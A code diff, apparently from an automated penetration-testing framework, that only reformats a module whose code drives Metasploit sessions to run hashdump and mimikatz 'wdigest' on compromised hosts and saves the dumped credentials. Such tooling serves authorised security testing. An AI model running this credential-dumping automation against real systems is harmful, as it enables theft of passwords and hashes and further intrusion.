@@ -42,25 +42,27 @@ class msf_dumphashes(actionModule):
                             msf.execute("sessions -i " + str(s) + "\n")
                             msf.execute("hashdump\n")
                             msf.execute("background\n")
-    
+
                             # TODO - process results and store results in KB
-                            outfile = self.config["proofsDir"] + self.shortName + "_HashDump_" + t + "_" + Utils.getRandStr(
+                            outfile = self.config[
+                                          "proofsDir"] + self.shortName + "_HashDump_" + t + "_" + Utils.getRandStr(
                                 10)
                             text = msf.getResult()
                             Utils.writeFile(text, outfile)
-                            kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/","%2F"))
-    
+                            kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/", "%2F"))
+
                             msf.execute("sessions -i " + str(s) + "\n")
                             msf.execute("load mimikatz\n")
                             msf.execute("wdigest\n")
                             msf.execute("background\n")
-    
+
                             # TODO - process results and store results in KB
-                            outfile = self.config["proofsDir"] + self.shortName + "_Mimikatz_" + t + "_" + Utils.getRandStr(
+                            outfile = self.config[
+                                          "proofsDir"] + self.shortName + "_Mimikatz_" + t + "_" + Utils.getRandStr(
                                 10)
                             text = msf.getResult()
                             Utils.writeFile(text, outfile)
-                            kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/","%2F"))
+                            kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/", "%2F"))
 
             # clean up after ourselves
             result = msf.cleanup()
